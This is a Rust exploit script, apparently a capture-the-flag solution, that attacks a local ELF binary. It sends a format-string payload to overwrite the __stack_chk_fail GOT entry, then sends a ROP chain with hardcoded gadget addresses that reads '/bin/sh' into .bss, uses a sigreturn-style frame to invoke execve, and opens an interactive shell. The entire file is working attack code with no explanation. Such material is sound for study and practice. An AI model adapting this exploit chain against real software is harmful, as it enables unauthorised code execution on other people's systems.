use clap::Parser;
use pwntools::{connection::Connection, connection::Process, pwn::*, util::*};
use std::{io, time};

#[derive(Parser)]
struct Opts {
    elf_file: String,
}
fn main() -> io::Result<()> {
    let opts: Opts = Opts::parse();

    let mut conn = Process::new(&opts.elf_file)?;

    let pwn = Pwn::new(&opts.elf_file);

    let ret = 0x401256_u64;
    let pop_rdi = 0x4012c3_u64;
    let pop_rsi_r15 = 0x4012c1_u64;
    let syscall = 0x40118f_u64;

    let mut payload = Payload::default();
    payload += &b"%8$d%1$s"[..];
    payload.ljust(0x10, b'\0');
    payload += P64(pwn.got("__stack_chk_fail").unwrap());

    conn.sendline(payload.as_bytes())?;
    std::thread::sleep(time::Duration::from_millis(100));

    conn.sendline(format!("{}", ret).as_bytes())?;
    std::thread::sleep(time::Duration::from_millis(100));

    let mut payload = Payload::default();
    payload.ljust(0x11, b'A');
    payload += P64(pop_rdi);
    payload += P64(pwn.bss().unwrap());
    payload += P64(pop_rsi_r15);
    payload += P64(0x21);
    payload += P64(0);
    payload += P64(pwn.symbol("readn").unwrap());
    payload += P64(syscall);
    payload += P64(0) * 0xd;
    payload += P64(pwn.bss().unwrap());
    payload += P64(0) * 0x4;
    payload += P64(0x3b);
    payload += P64(0);
    payload += P64(pwn.bss().unwrap() + 0x200);
    payload += P64(syscall);
    payload += P64(0);
    payload += P64(0x33);
    payload += P64(0) * 5;

    conn.sendline(payload.as_bytes())?;
    std::thread::sleep(time::Duration::from_millis(100));

    conn.send(format!("{}{:A<24}\x0f", "/bin/sh\0", "").as_bytes())?;
    conn.interactive()?;

    Ok(())
}
